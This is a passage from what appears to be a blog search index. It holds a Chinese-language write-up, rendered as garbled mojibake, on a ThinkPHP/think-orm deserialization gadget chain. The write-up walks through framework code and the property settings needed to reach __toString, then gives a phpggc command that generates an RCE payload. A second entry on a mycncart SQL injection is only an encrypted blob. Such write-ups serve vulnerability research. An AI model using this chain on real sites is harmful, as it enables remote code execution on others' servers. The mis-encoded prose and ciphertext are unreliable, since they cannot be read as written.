array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123; return 1; &#125; return is_object($a) || $a != $b ? 1 : 0; &#125;); // ... return $data;&#125; è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¼ºè¡Œç½®$this-&gt;forceä¸ºtrueï¼Œç›´æ¥è¿”å›æˆ‘ä»¬å‰é¢æ„é€ çš„éç©º$this-&gt;data è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåˆ°äº†è°ƒç”¨checkAllowFieldsçš„ä½ç½® 1234567891011121314151617protected function checkAllowFields(): array&#123; // æ£€æµ‹å­—æ®µ if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; $query = $this-&gt;db();// æœ€ç»ˆçš„è§¦å‘__toStringçš„å‡½æ•° $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; return $this-&gt;field; &#125; // ...&#125; åŒæ ·ï¼Œä¸ºäº†åˆ°$this-&gt;db()å‡½æ•°çš„è°ƒç”¨ï¼Œéœ€è¦ æ„é€ $this-&gt;fieldä¸ºç©º æ„é€ $this-&gt;schemaä¸ºç©º å…¶å®è¿™ä¸¤ä¸ªåœ°æ–¹ä¸éœ€è¦æ„é€ ï¼Œé»˜è®¤éƒ½ä¸ºç©º æœ€ç»ˆï¼Œæˆ‘ä»¬ç»ˆäºåˆ°äº†å¯ä»¥è§¦å‘__toStringçš„ä½ç½® 123456public function db($scope = []): Query&#123; /** @var Query $query */ $query = self::$db-&gt;connect($this-&gt;connection) -&gt;name($this-&gt;name . $this-&gt;suffix)// toString -&gt;pk($this-&gt;pk); çœ‹åˆ°ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²æ‹¼æ¥äº†å˜›ï¼ï¼ï¼ ä¸è¿‡ä¸ºäº†è¾¾åˆ°è¯¥å‡ºæ‹¼æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—é¦–å…ˆæ»¡è¶³connectå‡½æ•°çš„è°ƒç”¨ã€‚æ­¤å¤„ä»£ç å°±ä¸è¯´äº†ï¼Œç½®$this-&gt;connectionä¸ºmysqlå³å¯ã€‚æ¥ä¸‹æ¥ï¼Œä¸ç®¡æ˜¯è®¾$this-&gt;nameè¿˜æ˜¯$this-&gt;suffixä¸ºæœ€ç»ˆçš„è§¦å‘__toStringçš„å¯¹è±¡ï¼Œéƒ½ä¼šæœ‰åŒæ ·çš„æ•ˆæœã€‚ åç»­çš„æ€è·¯ï¼Œå°±æ˜¯åŸæ¥vendor/topthink/think-orm/src/model/concern/Conversion.phpçš„__toStringå¼€å§‹çš„åˆ©ç”¨é“¾ï¼Œä¸åœ¨å™è¿°ã€‚ æˆ‘æŠŠexpé›†æˆåˆ°äº†phpggcä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ 1./phpggc -u ThinkPHP/RCE2 'phpinfo();' è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚"},{"title":"mycncart sqli","permalink":"http://blog.0kami.cn/2019/02/25/php/mycncart-v2-0-0-3-sqli/","text":"welcome to my blog, enter password to read. Incorrect Password! No content to display! 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